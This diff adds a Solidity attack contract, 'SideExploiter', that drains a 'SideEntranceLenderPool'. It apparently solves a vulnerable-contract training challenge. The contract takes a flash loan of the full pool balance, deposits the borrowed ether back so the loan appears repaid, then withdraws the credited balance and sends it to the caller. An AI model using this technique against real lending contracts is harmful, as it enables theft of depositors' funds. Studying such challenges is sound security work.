@@ -36,3 +36,21 @@ contract SideEntranceLenderPool {
     }
 }
  
+contract SideExploiter{
+    address pool;
+    constructor(address _pool) public{
+        pool = _pool;
+    }
+    function execute() external payable {
+        SideEntranceLenderPool(pool).deposit{value: msg.value}();     
+    }
+    function exploit() external {
+        SideEntranceLenderPool(pool).flashLoan(address(pool).balance );   
+        SideEntranceLenderPool(pool).withdraw();  
+        address payable attacker = payable(msg.sender);      
+        attacker.transfer(address(this).balance);
+    }
+
+    fallback() external payable{}
+    
+}
